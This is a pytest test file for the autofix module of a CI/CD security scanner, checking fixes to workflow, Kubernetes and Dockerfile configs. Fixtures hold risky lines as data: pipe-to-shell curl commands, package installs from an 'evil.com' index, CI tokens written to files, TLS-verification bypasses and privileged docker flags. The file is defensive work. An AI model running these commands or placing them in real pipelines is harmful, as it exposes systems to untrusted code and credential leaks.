"""Tests for core.autofix."""
from __future__ import annotations

from pipeline_check.core import autofix
from pipeline_check.core.checks.base import Finding, Severity


def _finding(check_id: str, resource: str = "wf.yml") -> Finding:
    return Finding(
        check_id=check_id,
        title="x",
        severity=Severity.MEDIUM,
        resource=resource,
        description="",
        recommendation="",
        passed=False,
    )


def test_gha004_adds_permissions_block_before_jobs():
    wf = (
        "name: ci\n"
        "\n"
        "on: push\n"
        "\n"
        "jobs:\n"
        "  build:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps: [{run: echo}]\n"
    )
    after = autofix.generate_fix(_finding("GHA-004"), wf)
    assert after is not None
    assert "permissions:\n  contents: read" in after
    # The inserted block sits above `jobs:`.
    assert after.index("permissions:") < after.index("jobs:")


def test_gha004_idempotent_when_block_exists():
    wf = (
        "name: ci\n"
        "permissions:\n"
        "  contents: read\n"
        "on: push\n"
        "jobs: {}\n"
    )
    assert autofix.generate_fix(_finding("GHA-004"), wf) is None


def test_generate_fix_returns_none_for_unknown_check_id():
    assert autofix.generate_fix(_finding("UNKNOWN-999"), "anything") is None


def test_render_patch_produces_unified_diff():
    patch = autofix.render_patch("wf.yml", "a\n", "b\n")
    assert "--- a/wf.yml" in patch
    assert "+++ b/wf.yml" in patch
    assert "-a" in patch
    assert "+b" in patch


def test_available_fixers_includes_gha004():
    assert "GHA-004" in autofix.available_fixers()


class TestGHA037PersistCredentials:
    """GHA-037 reuses the GHA-002 checkout fixer: adding
    ``persist-credentials: false`` is its canonical fix."""

    _WF = (
        "on: push\n"
        "jobs:\n"
        "  b:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - uses: actions/checkout@v4\n"
        "      - run: ./build.sh\n"
    )

    def test_registered_as_a_safe_fixer(self):
        assert "GHA-037" in autofix.available_fixers()
        assert autofix.fixer_safety("GHA-037") == autofix.SAFE

    def test_adds_persist_credentials_false_to_checkout(self):
        after = autofix.generate_fix(_finding("GHA-037"), self._WF)
        assert after is not None
        assert "persist-credentials: false" in after
        # The flag lands under a with: block on the checkout step.
        assert "with:" in after

    def test_idempotent_when_flag_present(self):
        wf = (
            "on: push\n"
            "jobs:\n"
            "  b:\n"
            "    runs-on: ubuntu-latest\n"
            "    steps:\n"
            "      - uses: actions/checkout@v4\n"
            "        with:\n"
            "          persist-credentials: false\n"
        )
        assert autofix.generate_fix(_finding("GHA-037"), wf) is None

    def test_gha054_ssh_key_shares_the_same_fix(self):
        # GHA-054 (checkout ssh-key persisted into .git/config) is resolved
        # by the same persist-credentials: false edit.
        wf = (
            "on: push\n"
            "jobs:\n"
            "  b:\n"
            "    runs-on: ubuntu-latest\n"
            "    steps:\n"
            "      - uses: actions/checkout@v4\n"
            "        with:\n"
            "          ssh-key: ${{ secrets.DEPLOY_KEY }}\n"
        )
        assert "GHA-054" in autofix.available_fixers()
        assert autofix.fixer_safety("GHA-054") == autofix.SAFE
        after = autofix.generate_fix(_finding("GHA-054"), wf)
        assert after is not None
        assert "persist-credentials: false" in after


# ── Timeout fixers ─────────────────────────────────────────────────────


class TestGHA015Timeout:
    def test_inserts_timeout_in_job_missing_it(self):
        wf = (
            "jobs:\n"
            "  build:\n"
            "    runs-on: ubuntu-latest\n"
            "    steps:\n"
            "      - run: echo\n"
        )
        after = autofix.generate_fix(_finding("GHA-015"), wf)
        assert after is not None
        assert "build:\n    timeout-minutes: 30" in after

    def test_skips_job_with_timeout(self):
        wf = (
            "jobs:\n"
            "  build:\n"
            "    timeout-minutes: 10\n"
            "    runs-on: ubuntu-latest\n"
        )
        assert autofix.generate_fix(_finding("GHA-015"), wf) is None

    def test_does_not_inject_under_steps(self):
        wf = (
            "jobs:\n"
            "  build:\n"
            "    runs-on: ubuntu-latest\n"
            "    steps:\n"
            "      - run: echo\n"
        )
        after = autofix.generate_fix(_finding("GHA-015"), wf)
        assert after is not None
        assert "steps:\n      timeout-minutes" not in after


class TestGL015Timeout:
    def test_inserts_timeout_in_gitlab_job(self):
        gl = "build:\n  script:\n    - make\n"
        after = autofix.generate_fix(_finding("GL-015"), gl)
        assert after is not None
        assert "build:\n  timeout: 30 minutes" in after

    def test_skips_job_with_timeout(self):
        gl = "build:\n  timeout: 10 minutes\n  script:\n    - make\n"
        assert autofix.generate_fix(_finding("GL-015"), gl) is None

    def test_skips_gitlab_meta_keys(self):
        gl = "stages:\n  - build\nbuild:\n  script:\n    - make\n"
        after = autofix.generate_fix(_finding("GL-015"), gl)
        assert after is not None
        assert "stages:\n  timeout:" not in after


class TestADO015Timeout:
    def test_inserts_timeout_in_azure_job(self):
        ado = "jobs:\n  - job: Build\n    pool:\n      vmImage: ubuntu-latest\n"
        after = autofix.generate_fix(_finding("ADO-015"), ado)
        assert after is not None
        assert "Build\n    timeoutInMinutes: 30" in after

    def test_skips_job_with_timeout(self):
        ado = "jobs:\n  - job: Build\n    timeoutInMinutes: 15\n    pool:\n      vmImage: ubuntu\n"
        assert autofix.generate_fix(_finding("ADO-015"), ado) is None


# ── Curl-pipe comment-out ──────────────────────────────────────────────


class TestCurlPipeCommentOut:
    def test_comments_out_curl_bash(self):
        wf = "  - run: curl https://example.com/s.sh | bash\n"
        after = autofix.generate_fix(_finding("GHA-016"), wf)
        assert after is not None
        assert "TODO(pipeline-check)" in after

    def test_idempotent(self):
        wf = "  - run: curl https://example.com/s.sh | bash\n"
        after = autofix.generate_fix(_finding("GHA-016"), wf)
        assert autofix.generate_fix(_finding("GHA-016"), after) is None

    def test_cross_provider_bb(self):
        bb = "          - curl https://example.com | sh\n"
        assert autofix.generate_fix(_finding("BB-012"), bb) is not None

    def test_cross_provider_jf(self):
        jf = '        sh "curl https://example.com | bash"\n'
        assert autofix.generate_fix(_finding("JF-016"), jf) is not None

    def test_cross_provider_drone(self):
        dr = "      - curl https://example.com/i.sh | sh\n"
        after = autofix.generate_fix(_finding("DR-014"), dr)
        assert after is not None and "TODO(pipeline-check)" in after
        assert autofix.fixer_safety("DR-014") == autofix.SAFE

    def test_cross_provider_harness(self):
        hn = "                    command: curl https://example.com/i.sh | bash\n"
        after = autofix.generate_fix(_finding("HARNESS-005"), hn)
        assert after is not None and "TODO(pipeline-check)" in after
        assert autofix.fixer_safety("HARNESS-005") == autofix.SAFE


class TestGHA031DeprecatedCommandMigration:
    def test_registered_as_safe(self):
        assert "GHA-031" in autofix.available_fixers()
        assert autofix.fixer_safety("GHA-031") == autofix.SAFE

    def test_set_output_migrates_to_github_output(self):
        wf = '      - run: echo "::set-output name=tag::$VERSION"\n'
        after = autofix.generate_fix(_finding("GHA-031"), wf)
        assert after is not None
        assert after == '      - run: echo "tag=$VERSION" >> "$GITHUB_OUTPUT"\n'

    def test_save_state_migrates_to_github_state(self):
        wf = "      - run: echo '::save-state name=st::abc'\n"
        after = autofix.generate_fix(_finding("GHA-031"), wf)
        assert after is not None
        assert 'echo "st=abc" >> "$GITHUB_STATE"' in after

    def test_idempotent_after_migration(self):
        wf = '      - run: echo "tag=$VERSION" >> "$GITHUB_OUTPUT"\n'
        assert autofix.generate_fix(_finding("GHA-031"), wf) is None


# ── Docker flag removal ────────────────────────────────────────────────


class TestDockerFlagRemoval:
    # These fixers are registered ``unsafe`` (whole-file flag strip can
    # touch unrelated commands), so they only run under tier="unsafe".
    def test_strips_privileged(self):
        wf = "  - run: docker run --privileged ubuntu:latest cmd\n"
        after = autofix.generate_fix(_finding("GHA-017"), wf, tier="unsafe")
        assert after is not None
        assert "--privileged" not in after
        assert "docker run" in after

    def test_not_applied_under_safe_tier(self):
        wf = "  - run: docker run --privileged ubuntu:latest cmd\n"
        assert autofix.generate_fix(_finding("GHA-017"), wf) is None

    def test_strips_host_mount(self):
        wf = "  - run: docker run -v /host:/mnt ubuntu:latest cmd\n"
        after = autofix.generate_fix(_finding("GHA-017"), wf, tier="unsafe")
        assert after is not None
        assert "-v /host:/mnt" not in after

    def test_idempotent(self):
        wf = "  - run: docker run --privileged ubuntu:latest\n"
        after = autofix.generate_fix(_finding("GHA-017"), wf, tier="unsafe")
        assert autofix.generate_fix(
            _finding("GHA-017"), after, tier="unsafe",
        ) is None

    def test_cross_provider_gl(self):
        gl = "    - docker run --net=host myimage\n"
        after = autofix.generate_fix(_finding("GL-017"), gl, tier="unsafe")
        assert after is not None
        assert "--net=host" not in after


# ── Package flag removal ───────────────────────────────────────────────


class TestPkgFlagRemoval:
    # Registered ``unsafe`` (whole-file strip), so only runs under
    # tier="unsafe".
    def test_strips_insecure_index_url(self):
        wf = "  - run: pip install --index-url http://evil.com/simple/ requests\n"
        after = autofix.generate_fix(_finding("GHA-018"), wf, tier="unsafe")
        assert after is not None
        assert "--index-url" not in after
        assert "pip install" in after

    def test_not_applied_under_safe_tier(self):
        wf = "  - run: pip install --trusted-host evil.com pkg\n"
        assert autofix.generate_fix(_finding("GHA-018"), wf) is None

    def test_strips_trusted_host(self):
        wf = "  - run: pip install --trusted-host evil.com pkg\n"
        after = autofix.generate_fix(_finding("GHA-018"), wf, tier="unsafe")
        assert after is not None
        assert "--trusted-host" not in after

    def test_strips_npm_insecure_registry(self):
        wf = "  - run: npm install --registry=http://evil.com pkg\n"
        after = autofix.generate_fix(_finding("BB-014"), wf, tier="unsafe")
        assert after is not None
        assert "--registry" not in after

    def test_idempotent(self):
        wf = "  - run: pip install --trusted-host evil.com pkg\n"
        after = autofix.generate_fix(_finding("GHA-018"), wf, tier="unsafe")
        assert autofix.generate_fix(
            _finding("GHA-018"), after, tier="unsafe",
        ) is None


# ── Jenkins Groovy secret redaction ────────────────────────────────────


class TestJF008SecretRedaction:
    def test_redacts_aws_key(self):
        jf = '  AWS_KEY = "AKIAZ3MHALF2TESTHIJK"\n'
        after = autofix.generate_fix(_finding("JF-008", "Jenkinsfile"), jf)
        assert after is not None
        assert "<REDACTED>" in after
        assert "AKIAZ3MHALF2TESTHIJK" not in after

    def test_preserves_non_secret(self):
        jf = '  SAFE = "hello"\n'
        assert autofix.generate_fix(_finding("JF-008", "Jenkinsfile"), jf) is None

    def test_idempotent(self):
        jf = '  AWS_KEY = "AKIAZ3MHALF2TESTHIJK"\n'
        after = autofix.generate_fix(_finding("JF-008", "Jenkinsfile"), jf)
        assert autofix.generate_fix(_finding("JF-008", "Jenkinsfile"), after) is None


# ── BB-005 Bitbucket timeout ─────────────────────────────────────────


class TestBB005Timeout:
    def test_inserts_max_time(self):
        wf = "pipelines:\n  default:\n    - step:\n        script:\n          - make\n"
        after = autofix.generate_fix(_finding("BB-005"), wf)
        assert after is not None
        assert "max-time: 120" in after

    def test_idempotent(self):
        wf = "pipelines:\n  default:\n    - step:\n        max-time: 60\n        script:\n          - make\n"
        assert autofix.generate_fix(_finding("BB-005"), wf) is None


# ── JF-015 Jenkins timeout ───────────────────────────────────────────


class TestJF015Timeout:
    def test_inserts_todo(self):
        jf = "pipeline {\n    agent any\n    stages {\n    }\n}\n"
        after = autofix.generate_fix(_finding("JF-015", "Jenkinsfile"), jf)
        assert after is not None
        assert "TODO(pipeline-check): wrap with timeout" in after

    def test_idempotent(self):
        jf = "pipeline {\n    // TODO(pipeline-check): wrap with timeout(time: 30, unit: 'MINUTES')\n    agent any\n}\n"
        assert autofix.generate_fix(_finding("JF-015", "Jenkinsfile"), jf) is None


# ── GHA-001 pinning TODO ────────────────────────────────────────────


class TestGHA001PinningTodo:
    def test_adds_todo_to_unpinned_action(self):
        wf = "    - uses: actions/checkout@v4\n"
        after = autofix.generate_fix(_finding("GHA-001"), wf)
        assert after is not None
        assert "TODO(pipeline-check): pin to commit SHA" in after

    def test_skips_sha_pinned_action(self):
        wf = "    - uses: actions/checkout@4959ce089c2fe0a3ab7b3aaa3aebc6a0a17b2af9\n"
        assert autofix.generate_fix(_finding("GHA-001"), wf) is None

    def test_idempotent(self):
        wf = "    - uses: actions/checkout@v4  # TODO(pipeline-check): pin to commit SHA\n"
        assert autofix.generate_fix(_finding("GHA-001"), wf) is None


# ── GL-001 image pinning TODO ────────────────────────────────────────


class TestGL001PinningTodo:
    def test_adds_todo_to_unpinned_image(self):
        wf = "  image: python:3.12\n"
        after = autofix.generate_fix(_finding("GL-001"), wf)
        assert after is not None
        assert "TODO(pipeline-check): pin to digest" in after

    def test_skips_digest_pinned_image(self):
        wf = "  image: python@sha256:abc123\n"
        assert autofix.generate_fix(_finding("GL-001"), wf) is None


# ── Token persistence comment-out ────────────────────────────────────


class TestTokenPersistenceCommentOut:
    def test_gha019_comments_out_token_line(self):
        wf = '  - run: echo $GITHUB_TOKEN >> .env\n'
        after = autofix.generate_fix(_finding("GHA-019"), wf)
        assert after is not None
        assert "WARNING(pipeline-check)" in after
        assert "# - run:" in after or "# echo" in after

    def test_gl020_comments_out_token_line(self):
        wf = "  - echo $CI_JOB_TOKEN >> /tmp/token.txt\n"
        after = autofix.generate_fix(_finding("GL-020"), wf)
        assert after is not None
        assert "WARNING(pipeline-check)" in after

    def test_idempotent(self):
        wf = "  # WARNING(pipeline-check): token written to persistent storage — remove this line\n  # echo $GITHUB_TOKEN >> .env\n"
        assert autofix.generate_fix(_finding("GHA-019"), wf) is None


# ── GHA-014 deploy environment stub ──────────────────────────────────


class TestGHA014DeployEnvStub:
    def test_inserts_environment_into_deploy_job(self):
        wf = "jobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n"
        after = autofix.generate_fix(_finding("GHA-014"), wf)
        assert after is not None
        assert "environment:" in after
        assert "TODO(pipeline-check)" in after

    def test_skips_job_with_existing_environment(self):
        wf = "jobs:\n  deploy:\n    environment: production\n    runs-on: ubuntu-latest\n"
        assert autofix.generate_fix(_finding("GHA-014"), wf) is None

    def test_skips_non_deploy_job(self):
        wf = "jobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n"
        assert autofix.generate_fix(_finding("GHA-014"), wf) is None


# ── Kubernetes drop-line fixers ───────────────────────────────────────


class TestK8sDropTrueLine:
    """K8S-002 / K8S-003 / K8S-004 / K8S-005 all drop a YAML key set to
    ``true``. Parameterized over the four rule IDs since the logic is
    identical."""

    def test_k8s005_drops_privileged_true(self):
        manifest = (
            "apiVersion: v1\n"
            "kind: Pod\n"
            "spec:\n"
            "  containers:\n"
            "    - name: c\n"
            "      image: nginx@sha256:abc\n"
            "      securityContext:\n"
            "        privileged: true\n"
        )
        after = autofix.generate_fix(_finding("K8S-005"), manifest)
        assert after is not None
        assert "privileged" not in after
        # Surrounding context preserved.
        assert "securityContext:" in after
        assert "image: nginx@sha256:abc" in after

    def test_k8s002_drops_host_network(self):
        manifest = "spec:\n  hostNetwork: true\n  containers: []\n"
        after = autofix.generate_fix(_finding("K8S-002"), manifest)
        assert after is not None
        assert "hostNetwork" not in after
        assert "containers: []" in after

    def test_k8s003_drops_host_pid(self):
        manifest = "spec:\n  hostPID: true\n"
        after = autofix.generate_fix(_finding("K8S-003"), manifest)
        assert after is not None
        assert "hostPID" not in after

    def test_k8s004_drops_host_ipc(self):
        manifest = "spec:\n  hostIPC: true\n"
        after = autofix.generate_fix(_finding("K8S-004"), manifest)
        assert after is not None
        assert "hostIPC" not in after

    def test_idempotent_when_key_absent(self):
        manifest = "spec:\n  containers: []\n"
        assert autofix.generate_fix(_finding("K8S-005"), manifest) is None
        assert autofix.generate_fix(_finding("K8S-002"), manifest) is None

    def test_skips_when_value_is_false(self):
        # Already at the safe default. No edit, ``None`` returned.
        manifest = "spec:\n  hostPID: false\n"
        assert autofix.generate_fix(_finding("K8S-003"), manifest) is None

    def test_each_rule_only_targets_its_own_key(self):
        # K8S-002 must not touch a hostPID line, etc.
        manifest = "spec:\n  hostNetwork: true\n  hostPID: true\n"
        after = autofix.generate_fix(_finding("K8S-002"), manifest)
        assert after is not None
        assert "hostNetwork" not in after
        assert "hostPID: true" in after


# ── Kubernetes flip-value fixers ──────────────────────────────────────


class TestK8sFlipValue:
    """K8S-006 / K8S-007 / K8S-008 flip an unsafe value in place
    rather than dropping the line, so any surrounding comment stays."""

    def test_k8s006_flips_allow_priv_escalation(self):
        manifest = "        allowPrivilegeEscalation: true\n"
        after = autofix.generate_fix(_finding("K8S-006"), manifest)
        assert after is not None
        assert "allowPrivilegeEscalation: false" in after

    def test_k8s007_flips_run_as_non_root(self):
        manifest = "        runAsNonRoot: false\n"
        after = autofix.generate_fix(_finding("K8S-007"), manifest)
        assert after is not None
        assert "runAsNonRoot: true" in after

    def test_k8s008_flips_read_only_root_fs(self):
        manifest = "        readOnlyRootFilesystem: false\n"
        after = autofix.generate_fix(_finding("K8S-008"), manifest)
        assert after is not None
        assert "readOnlyRootFilesystem: true" in after

    def test_preserves_inline_comment(self):
        manifest = "        readOnlyRootFilesystem: false  # legacy bug\n"
        after = autofix.generate_fix(_finding("K8S-008"), manifest)
        assert after is not None
        assert "readOnlyRootFilesystem: true" in after
        assert "# legacy bug" in after

    def test_idempotent_when_already_safe(self):
        # Flipped values are already correct.
        m6 = "        allowPrivilegeEscalation: false\n"
        m7 = "        runAsNonRoot: true\n"
        m8 = "        readOnlyRootFilesystem: true\n"
        assert autofix.generate_fix(_finding("K8S-006"), m6) is None
        assert autofix.generate_fix(_finding("K8S-007"), m7) is None
        assert autofix.generate_fix(_finding("K8S-008"), m8) is None

    def test_no_op_when_key_absent(self):
        manifest = "spec:\n  containers: []\n"
        assert autofix.generate_fix(_finding("K8S-006"), manifest) is None
        assert autofix.generate_fix(_finding("K8S-007"), manifest) is None
        assert autofix.generate_fix(_finding("K8S-008"), manifest) is None


# ── Kubernetes comment-only TODO fixers ───────────────────────────────


class TestK8s013HostPathTODO:
    def test_inserts_todo_above_hostpath(self):
        manifest = (
            "spec:\n"
            "  volumes:\n"
            "    - name: data\n"
            "      hostPath:\n"
            "        path: /var/log\n"
        )
        after = autofix.generate_fix(_finding("K8S-013"), manifest)
        assert after is not None
        assert "TODO(pipeline-check K8S-013)" in after
        # Comment lands above the hostPath: line, not below.
        idx_todo = after.index("TODO(pipeline-check K8S-013)")
        idx_hp = after.index("hostPath:")
        assert idx_todo < idx_hp

    def test_idempotent_after_run(self):
        manifest = (
            "spec:\n"
            "  volumes:\n"
            "    - name: data\n"
            "      hostPath:\n"
            "        path: /var/log\n"
        )
        once = autofix.generate_fix(_finding("K8S-013"), manifest)
        assert once is not None
        twice = autofix.generate_fix(_finding("K8S-013"), once)
        assert twice is None

    def test_no_op_when_no_hostpath(self):
        manifest = "spec:\n  volumes: []\n"
        assert autofix.generate_fix(_finding("K8S-013"), manifest) is None


class TestK8s020ClusterAdminTODO:
    def test_inserts_todo_above_cluster_admin_name(self):
        manifest = (
            "kind: ClusterRoleBinding\n"
            "roleRef:\n"
            "  apiGroup: rbac.authorization.k8s.io\n"
            "  kind: ClusterRole\n"
            "  name: cluster-admin\n"
        )
        after = autofix.generate_fix(_finding("K8S-020"), manifest)
        assert after is not None
        assert "TODO(pipeline-check K8S-020)" in after

    def test_matches_system_masters_too(self):
        manifest = "  name: system:masters\n"
        after = autofix.generate_fix(_finding("K8S-020"), manifest)
        assert after is not None
        assert "TODO(pipeline-check K8S-020)" in after

    def test_skips_unrelated_name_lines(self):
        manifest = "metadata:\n  name: my-deployment\n"
        assert autofix.generate_fix(_finding("K8S-020"), manifest) is None

    def test_idempotent_after_run(self):
        manifest = "  name: cluster-admin\n"
        once = autofix.generate_fix(_finding("K8S-020"), manifest)
        assert once is not None
        twice = autofix.generate_fix(_finding("K8S-020"), once)
        assert twice is None


# ── Cloud Build fixers ────────────────────────────────────────────────


class TestGCB005Timeout:
    def test_inserts_timeout_at_top(self):
        cb = "steps:\n  - name: 'gcr.io/cloud-builders/gcloud'\n    args: ['version']\n"
        after = autofix.generate_fix(_finding("GCB-005"), cb)
        assert after is not None
        assert after.startswith("timeout: '600s'\n")

    def test_idempotent_when_timeout_present(self):
        cb = "timeout: '300s'\nsteps: []\n"
        assert autofix.generate_fix(_finding("GCB-005"), cb) is None

    def test_no_op_when_not_a_cloudbuild_doc(self):
        # No top-level cloudbuild keys at all — fixer punts rather than
        # inserting at column 0 of a random doc.
        assert autofix.generate_fix(_finding("GCB-005"), "name: not-cb\n") is None


class TestGCB014Logging:
    def test_drops_logging_none(self):
        cb = "options:\n  logging: NONE\nsteps: []\n"
        after = autofix.generate_fix(_finding("GCB-014"), cb)
        assert after is not None
        assert "logging: NONE" not in after
        assert "options:" in after

    def test_handles_quoted_value(self):
        cb = "options:\n  logging: 'NONE'\n"
        after = autofix.generate_fix(_finding("GCB-014"), cb)
        assert after is not None
        assert "logging" not in after

    def test_idempotent_when_absent(self):
        assert autofix.generate_fix(_finding("GCB-014"), "options:\n  machineType: N1_HIGHCPU_8\n") is None


class TestGCB001PinTODO:
    def test_inserts_todo_above_unpinned_step(self):
        cb = "steps:\n  - name: 'gcr.io/cloud-builders/gcloud'\n"
        after = autofix.generate_fix(_finding("GCB-001"), cb)
        assert after is not None
        assert "TODO(pipeline-check GCB-001)" in after

    def test_skips_already_digest_pinned(self):
        cb = "steps:\n  - name: 'gcr.io/cloud-builders/gcloud@sha256:abcd'\n"
        assert autofix.generate_fix(_finding("GCB-001"), cb) is None

    def test_idempotent_after_run(self):
        cb = "steps:\n  - name: 'gcr.io/cloud-builders/gcloud'\n"
        once = autofix.generate_fix(_finding("GCB-001"), cb)
        assert once is not None
        twice = autofix.generate_fix(_finding("GCB-001"), once)
        assert twice is None


class TestGCB011TLSBypass:
    def test_reuses_shared_tls_bypass_fixer(self):
        # GCB-011 piggybacks on the same _comment_tls_bypass logic the
        # CI providers use. Use a curl -k command on its own line so
        # the shared _primitives.tls_bypass detector matches.
        cb = (
            "steps:\n"
            "  - name: bash\n"
            "    script: curl -k https://example.com\n"
        )
        after = autofix.generate_fix(_finding("GCB-011"), cb)
        assert after is not None
        assert "TODO(pipeline-check): remove TLS/SSL verification bypass" in after


class TestDroneHarnessTLSBypass:
    # DR-006 / HARNESS-006 detect TLS bypass through the same
    # _primitives.tls_bypass detector as every other provider, so they
    # share _comment_tls_bypass (the analog of DR-014 / HARNESS-005 already
    # sharing the curl-pipe fixer).
    def test_dr006_comments_out_tls_bypass(self):
        dr = "      - curl --insecure https://example.com/x.sh -o x.sh\n"
        after = autofix.generate_fix(_finding("DR-006"), dr)
        assert after is not None
        assert "TODO(pipeline-check): remove TLS/SSL verification bypass" in after
        assert autofix.fixer_safety("DR-006") == autofix.SAFE
        # idempotent: the commented line isn't re-flagged
        assert autofix.generate_fix(_finding("DR-006"), after) is None

    def test_harness006_comments_out_tls_bypass(self):
        hn = "                      npm config set strict-ssl false\n"
        after = autofix.generate_fix(_finding("HARNESS-006"), hn)
        assert after is not None
        assert "TODO(pipeline-check): remove TLS/SSL verification bypass" in after
        assert autofix.fixer_safety("HARNESS-006") == autofix.SAFE


# ── Dockerfile comment-only TODO fixers ───────────────────────────────


class TestDF001PinTODO:
    def test_inserts_todo_above_floating_from(self):
        df = "FROM python:3.12-slim\nRUN echo hi\n"
        after = autofix.generate_fix(_finding("DF-001"), df)
        assert after is not None
        assert "TODO(pipeline-check DF-001)" in after
        idx_todo = after.index("TODO(pipeline-check DF-001)")
        idx_from = after.index("FROM python:3.12-slim")
        assert idx_todo < idx_from

    def test_skips_already_digest_pinned(self):
        df = "FROM python@sha256:" + "0" * 63 + "1\n"
        assert autofix.generate_fix(_finding("DF-001"), df) is None

    def test_handles_multistage_partially_pinned(self):
        # First FROM is digest-pinned (skipped), second is floating
        # (annotated). Only one TODO inserted.
        df = (
            "FROM python@sha256:" + "0" * 63 + "1 AS build\n"
            "RUN make\n"
            "FROM debian:12.5\n"
            "COPY --from=build /out /app\n"
        )
        after = autofix.generate_fix(_finding("DF-001"), df)
        assert after is not None
        assert after.count("TODO(pipeline-check DF-001)") == 1

    def test_idempotent_after_run(self):
        df = "FROM debian:12.5\n"
        once = autofix.generate_fix(_finding("DF-001"), df)
        assert once is not None
        assert autofix.generate_fix(_finding("DF-001"), once) is None


class TestDF002UserTODO:
    def test_inserts_todo_above_cmd(self):
        df = "FROM debian:12.5\nCMD [\"sh\"]\n"
        after = autofix.generate_fix(_finding("DF-002"), df)
        assert after is not None
        assert "TODO(pipeline-check DF-002)" in after
        idx_todo = after.index("TODO(pipeline-check DF-002)")
        idx_cmd = after.index("CMD")
        assert idx_todo < idx_cmd

    def test_skips_when_user_directive_present(self):
        df = "FROM debian:12.5\nUSER appuser\nCMD [\"sh\"]\n"
        assert autofix.generate_fix(_finding("DF-002"), df) is None

    def test_no_op_when_no_cmd_or_entrypoint(self):
        df = "FROM debian:12.5\nRUN echo hi\n"
        assert autofix.generate_fix(_finding("DF-002"), df) is None


class TestDF007HealthCheckTODO:
    def test_inserts_todo_above_cmd(self):
        df = "FROM debian:12.5\nCMD [\"sh\"]\n"
        after = autofix.generate_fix(_finding("DF-007"), df)
        assert after is not None
        assert "TODO(pipeline-check DF-007)" in after

    def test_skips_when_healthcheck_present(self):
        df = (
            "FROM debian:12.5\n"
            "HEALTHCHECK CMD curl -fsS http://localhost/healthz || exit 1\n"
            "CMD [\"sh\"]\n"
        )
        assert autofix.generate_fix(_finding("DF-007"), df) is None


class TestDF013ExposeSSHTODO:
    def test_inserts_todo_above_expose_22(self):
        df = "FROM debian:12.5\nEXPOSE 22\n"
        after = autofix.generate_fix(_finding("DF-013"), df)
        assert after is not None
        assert "TODO(pipeline-check DF-013)" in after

    def test_no_op_for_application_port(self):
        df = "FROM debian:12.5\nEXPOSE 8080\n"
        assert autofix.generate_fix(_finding("DF-013"), df) is None

    def test_idempotent(self):
        df = "FROM debian:12.5\nEXPOSE 22\n"
        once = autofix.generate_fix(_finding("DF-013"), df)
        assert once is not None
        assert autofix.generate_fix(_finding("DF-013"), once) is None


class TestDF017PathTODO:
    def test_inserts_todo_above_tmp_prepend(self):
        df = "FROM debian:12.5\nENV PATH=/tmp:$PATH\n"
        after = autofix.generate_fix(_finding("DF-017"), df)
        assert after is not None
        assert "TODO(pipeline-check DF-017)" in after

    def test_no_op_when_writable_dir_at_tail(self):
        # Tail-position writable entry is harmless — system bins shadow
        # it. The fixer mirrors the rule's logic, so it shouldn't fire.
        df = "FROM debian:12.5\nENV PATH=$PATH:/tmp\n"
        assert autofix.generate_fix(_finding("DF-017"), df) is None

    def test_no_op_when_path_is_only_system_bins(self):
        df = "FROM debian:12.5\nENV PATH=/usr/bin:/usr/local/bin\n"
        assert autofix.generate_fix(_finding("DF-017"), df) is None


class TestK8S001ImagePinTODO:
    def test_inserts_todo_above_unpinned_image(self):
        manifest = (
            "spec:\n"
            "  containers:\n"
            "    - name: web\n"
            "      image: nginx:latest\n"
        )
        after = autofix.generate_fix(_finding("K8S-001"), manifest)
        assert after is not None
        assert "TODO(pipeline-check K8S-001)" in after
        # Comment sits above the offending image: line, not the name: line.
        lines = after.splitlines()
        todo_idx = next(i for i, ln in enumerate(lines) if "TODO" in ln)
        assert "image:" in lines[todo_idx + 1]

    def test_skips_digest_pinned_image(self):
        manifest = (
            "spec:\n"
            "  containers:\n"
            "    - name: api\n"
            "      image: api@sha256:" + "a" * 64 + "\n"
        )
        assert autofix.generate_fix(_finding("K8S-001"), manifest) is None

    def test_only_unpinned_get_todo_in_mixed_set(self):
        manifest = (
            "spec:\n"
            "  containers:\n"
            "    - name: web\n"
            "      image: nginx:latest\n"
            "    - name: api\n"
            "      image: api@sha256:" + "a" * 64 + "\n"
        )
        after = autofix.generate_fix(_finding("K8S-001"), manifest)
        assert after is not None
        # Exactly one TODO should appear (for the nginx:latest line).
        assert after.count("TODO(pipeline-check K8S-001)") == 1

    def test_handles_quoted_image_value(self):
        manifest = (
            "spec:\n"
            "  containers:\n"
            "    - name: web\n"
            '      image: "nginx:1.25.4"\n'
        )
        after = autofix.generate_fix(_finding("K8S-001"), manifest)
        assert after is not None

    def test_idempotent(self):
        manifest = (
            "spec:\n"
            "  containers:\n"
            "    - name: web\n"
            "      image: nginx:latest\n"
        )
        once = autofix.generate_fix(_finding("K8S-001"), manifest)
        assert once is not None
        assert autofix.generate_fix(_finding("K8S-001"), once) is None


class TestK8S028HostPortDrop:
    def test_drops_host_port_line(self):
        manifest = (
            "spec:\n"
            "  containers:\n"
            "    - name: app\n"
            "      image: nginx@sha256:" + "a" * 64 + "\n"
            "      ports:\n"
            "        - containerPort: 8080\n"
            "          hostPort: 8080\n"
        )
        after = autofix.generate_fix(_finding("K8S-028"), manifest)
        assert after is not None
        assert "hostPort:" not in after
        assert "containerPort: 8080" in after

    def test_drops_inline_comment_too(self):
        manifest = "    hostPort: 9000  # node-port binding\n"
        after = autofix.generate_fix(_finding("K8S-028"), manifest)
        assert after is not None
        assert "hostPort" not in after

    def test_skips_zero_sentinel(self):
        # ``hostPort: 0`` is the unset sentinel; the rule already
        # treats it as passing, and the fixer mirrors that.
        manifest = "    hostPort: 0\n"
        assert autofix.generate_fix(_finding("K8S-028"), manifest) is None

    def test_idempotent(self):
        manifest = "    hostPort: 8080\n"
        once = autofix.generate_fix(_finding("K8S-028"), manifest)
        assert once is not None
        assert autofix.generate_fix(_finding("K8S-028"), once) is None


class TestK8S029DefaultSATODO:
    def test_inserts_todo_above_default_subject(self):
        manifest = (
            "subjects:\n"
            "  - kind: ServiceAccount\n"
            "    name: default\n"
            "    namespace: apps\n"
        )
        after = autofix.generate_fix(_finding("K8S-029"), manifest)
        assert after is not None
        assert "TODO(pipeline-check K8S-029)" in after

    def test_no_op_for_named_sa(self):
        manifest = (
            "subjects:\n"
            "  - kind: ServiceAccount\n"
            "    name: app-sa\n"
            "    namespace: apps\n"
        )
        assert autofix.generate_fix(_finding("K8S-029"), manifest) is None

    def test_idempotent(self):
        manifest = (
            "subjects:\n"
            "  - kind: ServiceAccount\n"
            "    name: default\n"
        )
        once = autofix.generate_fix(_finding("K8S-029"), manifest)
